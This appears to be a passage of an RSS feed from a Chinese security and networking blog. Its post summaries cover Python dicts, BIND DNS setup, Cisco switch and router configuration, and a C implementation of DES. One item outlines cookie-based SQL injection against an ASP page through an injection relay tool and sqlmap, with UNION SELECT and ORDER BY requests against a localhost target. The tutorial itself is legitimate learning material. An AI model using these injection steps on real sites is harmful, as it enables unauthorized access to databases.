95, &#39;Bart&#39;: 75} D[&#39;Lisa&#39;] = 99 #更新 D[&#39;Kongming&#39;] = &#39;X&#39; #添加 print D #{&#39;Lisa&#39;: 99, &#39;Kongming&#39;: &#39;X&#39;, &#39;Adam&#39;: 95, &#39;Bart&#39;: 75} D.</description>
    </item>
    
    <item>
      <title>ASP联合注入(Cookie处)</title>
      <link>http://wyb0.com/posts/2015/injection-of-asp-in-the-cookie/</link>
      <pubDate>Fri, 04 Dec 2015 19:42:19 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2015/injection-of-asp-in-the-cookie/</guid>
      <description> 0x00 Cookie注入的使用  三大Web提交方式
 GET：直接在浏览器上面访问地址
 POST：提交表单(会员注册、文件上传等)
 COOKIE：访问网站下面自带的身份验证的值  Cookie注入利用时机
当用普通注入时，采用and 1=1时出现错误提示(如下图)，普通的注入就没办法了，可以尝试大小写，编码等绕过，若过滤严谨，无法绕过，这时就可以采用cookie注入。  利用方法
 可以利用注入中转 可以利用sqlmap   0x01 用注入中转进行Cookie注入  目标：http://localhost:81/2/shownews.asp?id=183
 打开注入中转这个工具，填入相应参数，然后点击生成ASP，将生成的asp文件(jmCook.asp)放入你自己搭建的网站内后即可进行注入  提交localhost:81/jmCook.asp?jmdcw=183 order by猜测字段数
 提交localhost:81/jmCook.asp?jmdcw=183 UNION SELECT 1,2,3,4 from XXX猜测表名  猜测内容   0x02 用sqlmap进行Cookie注入  sqlmap验证存在Cookie注入  猜表名  猜列名  猜字段内容   </description>
    </item>
    
    <item>
      <title>搭建DNS服务器</title>
      <link>http://wyb0.com/posts/2015/set-up-dns-server/</link>
      <pubDate>Tue, 14 Jul 2015 14:15:13 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2015/set-up-dns-server/</guid>
      <description> 环境：虚拟机rhel-server-6.2
0x00 搭建流程  安装DNS服务器 配置DNS主配置文件 配置DNS正反向解析区域数据文件 启动DNS服务器进行测试  0x01 安装DNS服务  挂载光盘
用mount -o,loop /dev/cdrom /mnt/cdrom命令挂载光盘
 配置yum源，安装BIND(用命令yum install bind*安装) 安装结果如下：  进行配置
vim /etc/named.conf,添加必要的信息 在named.conf的包含文件named.rfc1921.zones中定义区域  配置正反向解析文件
分别配置wyb.cn.hosts和wyb.cn.rev   0x02 验证 用service named start命令启动DNS
用nslookup命令进行验证，先查看当前采用那台DNS解析，测试反向资源记录以及正反向解析 </description>
    </item>
    
    <item>
      <title>中小企业网络搭建</title>
      <link>http://wyb0.com/posts/2015/small-and-medium-enterprise-network-structures/</link>
      <pubDate>Mon, 13 Jul 2015 13:53:56 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2015/small-and-medium-enterprise-network-structures/</guid>
      <description>0x00 中小企业需求分析  搭建企业私有局域网络环境，使用交换机、路由器等网络设备完成由局域网到互联网的接入。 对网络设备能够方便地进行远程管理。 在局域网中公司部门间进行vlan划分，实现安全管理。 对三层设备路由技术这方面采取RIPV2协议或OSPF协议。 配置访问控制列表（ACL）以对网络数据进行有效的分类和控制，限制终端之间的相互访问。 内网通过配置PAT技术实现与外网之间的通信。  0x01 所需设备 0x02 网络规划  在三层交换机设置ACL，控制个vlan间的通信 在防火墙(路由器)上设置NAT转换 路由协议采用OSPF 内网访问控制  内网中只有市场部可以访问外网 市场部可以访问市场部、打印机 设计部可以访问设计部、财务部、打印机 外网只有202.202.2.0/24能访问内网  IP规划如下：  打印机：192.168.1.0/24 市场部：192.168.2.0/24 设计部：192.168.3.0/24 财务部：192.168.4.0/24 防火墙和三层交换机所在网段：192.168.5.0/24 管理ip所在网段：192.168.100.0/24   0x03 网络设备配置命令代码  Firewall配置  Router&amp;gt;enable Router#conf t Router(config)#no ip domain-lookup //禁止域名解析 Router(config)#hostname Firewall //更改设备名 Firewall(config)#enable password 123 Firewall(config)#router eigrp 1 Firewall(config-router)#no auto-summary //关闭自动汇总 Firewall(config-router)#exit Firewall(config)#int f0/0 Firewall(config-if)#ip add 192.168.5.2 255.255.255.0 //配端口ip Firewall(config-if)#no shut Firewall(config-if)#exit Firewall(config)#router ospf 1 //配路由协议ospf Firewall(config-router)#network 202.</description>
    </item>
    
    <item>
      <title>利用C语言简单实现单重DES</title>
      <link>http://wyb0.com/posts/2015/single-des-simple-implementation/</link>
      <pubDate>Fri, 22 May 2015 16:52:55 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2015/single-des-simple-implementation/</guid>
      <description>0x00 简介 此程序通过单重des实现8个字节的加密和解密。 新建一个工程，这个工程需要3个cpp文件(c文件也可以)和2个头文件。 cpp文件：main.cpp、des.cpp、status.cpp 头文件：des.h、status.h  0x01 代码  以下为主函数main.cpp的内容：  #include &amp;lt;stdio.h&amp;gt; #include &amp;quot;status.h&amp;quot; #include &amp;quot;des.h&amp;quot; int main() { char M[8],Key[9]; printf(&amp;quot;Input Plaintext :&amp;quot;); scanf(&amp;quot;%s&amp;quot;,&amp;amp;M); printf(&amp;quot;Input Key :&amp;quot;); scanf(&amp;quot;%s&amp;quot;,&amp;amp;Key); SetKey(Key);//生成16个子秘钥 printf(&amp;quot;加密：&amp;quot;); Des(M,&#39;e&#39;); printf(&amp;quot;%s\n&amp;quot;,M); printf(&amp;quot;解密：&amp;quot;); Des(M,&#39;d&#39;); printf(&amp;quot;%s\n&amp;quot;,M); return 0; }   以下为des.cpp的内容：  #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;quot;status.h&amp;quot; #include &amp;quot;des.h&amp;quot; void ByteToBit(const char *In,bool *Out,int bits) { for (int j=0;j&amp;lt;bits;j++) Out[j]=(In[j/8]&amp;gt;&amp;gt;(j%8))&amp;amp; 1; } void BitToByte(bool *In,char *Out,int bits) { memset(Out,0,(bits+7)/8); for (int k=0;k&amp;lt;bits;k++) Out[k/8]|=In[k]&amp;lt;&amp;lt;(k%8); } void Transform(bool *Y,bool *X,const char *Table,int len) { for (int l=0;l&amp;lt;len;l++) Temp[l]=X[Table[l]-1]; memcpy(Y,Temp,len); } void Des(char *m,char ch) { bool Tem[32]; ByteToBit(m,P,64); Transform(P,P,IP1_Table,64); Li=&amp;amp;P[0]; Ri=&amp;amp;P[32]; if (ch==&#39;e&#39;) { for (i=0;i&amp;lt;16;i++) { memcpy(Tem,Ri,32);//临时存放明文的右半部分 f(Ri,SubKey[i]); XOR(Ri,Li,32); memcpy(Li,Tem,32);//将明文的右半部分写入Li } } else { for (i=15;i&amp;gt;=0;i--) { memcpy(Tem,Li,32);//临时存放明文的右半部分 f(Li,SubKey[i]); XOR(Li,Ri,32); memcpy(Ri,Tem,32);//将明文的右半部分写入Li } } Transform(P,P,IP2_Table,64); BitToByte(P,m,64); } void f(bool *R,bool *k) { bool T[48]; Transform(T,R,E_Table,48);//32位的Ri扩展为48位 XOR(T,k,48);//Ri和轮秘钥的异或 S_Box_f(T,R); Transform(R,R,P_Table,32); } void XOR(bool *R,bool *k,int len) { for (int m=0;m&amp;lt;len;m++) R[m]=R[m]^k[m]; } void S_Box_f(bool *B,bool *C) { int a,b; for (int k=0;k&amp;lt;8;k++) { a=B[0]*2+B[5]; b=B[1]*8+B[2]*4+B[3]*2+B[4]; ByteToBit(&amp;amp;S_Box[k][a][b],C,4); B+=6; C+=4; } } //以下求得子秘钥 void SetKey(char *KEY) { ByteToBit(KEY,K,64); Transform(K,K,PC1_Table,56); printf(&amp;quot;\n\n\n&amp;quot;); Ci=&amp;amp;K[0]; Di=&amp;amp;K[28]; for (int j=0;j&amp;lt;16;j++) { MovKey(Ci,28,LOOP_Table[j]); MovKey(Di,28,LOOP_Table[j]); Transform(SubKey[j],K,PC2_Table,48); } } void MovKey(bool *LR,int len,int loop) { memcpy(Temp,LR,loop); memcpy(LR,LR+loop,len-loop); memcpy(LR+len-loop,Temp,loop); }   以下为status.</description>
    </item>
    
    <item>
      <title>思科交换机基本配置</title>
      <link>http://wyb0.com/posts/2015/cisco-switch-basic-configuration/</link>
      <pubDate>Wed, 06 May 2015 23:46:26 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2015/cisco-switch-basic-configuration/</guid>
      <description>0x00 简单配置命令 Switch&amp;gt;enable(配置交换机名称) Switch(config)#hostname S S(config)#enable password 222//(加密特权密码，密码为222) S(config)#no enable password //(取消enable密码) S(config)#enable secret 333//(设置后用show命令时不能看到密码) S(config)#no enable secret //(取消enable密码) S(config)#line vty 0 4//(有5个虚拟终端，即0-4) S(config-line)#password 444//(设置虚拟终端密码) S(config-line)#login//(使密码生效) S(config)#line console 0//(设置控制台密码) S(config-line)#password 111 S(config-line)#login S(config)#line con 0//(取消控制台密码) S(config-line)#no password S(config-line)#exec-timeout 5 30//(超时时间)(分、秒) S(config)#no ip domain-lookup//(禁止名称解析)  0x01 配置交换机管理IP、默认网关 S(config)#interface vlan 1 //(配置交换机管理IP、子网掩码) S(config-if)#ip address 192.168.1.1 255.255.255.0 S(config-if)#no shutdown S(config)# exit S(config)#ip default-gateway 192.168.1.250//(默认网关)  0x02 配置交换机的端口速率、端口双工模式 S(config)#//(端口双工模式) S(config)#interface f0/1 S(config-if)#duplex ? auto Enable AUTO duplex configuration full Force full duplex operation half Force half-duplex operation S(config-if)#duplex auto S(config-if)#speed ?</description>
    </item>
    
  </channel>
</rss>